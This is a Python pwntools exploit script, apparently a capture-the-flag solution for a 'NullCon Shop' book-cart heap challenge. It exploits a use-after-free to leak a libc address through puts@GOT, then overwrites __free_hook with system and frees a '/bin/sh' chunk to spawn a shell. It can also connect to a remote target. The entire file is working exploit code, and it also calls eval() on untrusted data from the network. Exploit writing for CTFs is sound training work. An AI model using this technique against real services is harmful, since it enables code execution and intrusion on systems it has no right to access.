#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import warnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chall')
libc = ELF("./libc.so.6", checksec=False)
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'
warnings.simplefilter("ignore", BytesWarning)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def add_book(size, name, price):
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b"length:", str(size).encode())
    io.sendafter(b"name:", name)
    io.sendlineafter(b"price:", str(price).encode())

def remove_book(idx):
    io.sendline(b"2")
    io.sendlineafter(b"index:", str(idx).encode())

def view_book():
    io.sendlineafter(b">", b"3")

 
def solve():
    menu = b"""
        NullCon Shop
        (1) Add book to cart
        (2) Remove from cart
        (3) View cart
        (4) Check out
        > 
	"""

    for i in range(8):
	    add_book(8, b"/bin/sh\x00", 100)

    remove_book(0)
    remove_book(1)

    forged = p64(0x1337) + p64(exe.got["puts"]) + p64(0x1337) + b"HIJACKED POINTER VIA UAF!!!"
    add_book(0x38, forged, 1337)
    view_book()
    
    data = io.recvuntil(b"> ").strip(menu)
    books = eval(data.decode("latin-1"))
    name_ptr = books["Books"][0]["name"]
    puts = u64(name_ptr.ljust(8, "\x00"))
    libc.address = puts - libc.sym["puts"]
    info("libc base: %#x", libc.address)

    free_hook = libc.sym["__free_hook"]
    system = libc.sym["system"]

    remove_book(2)
    remove_book(2)
    remove_book(3)

    add_book(0x38, p64(free_hook), 1)
    add_book(0x38, p64(system), 2)

    remove_book(4)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

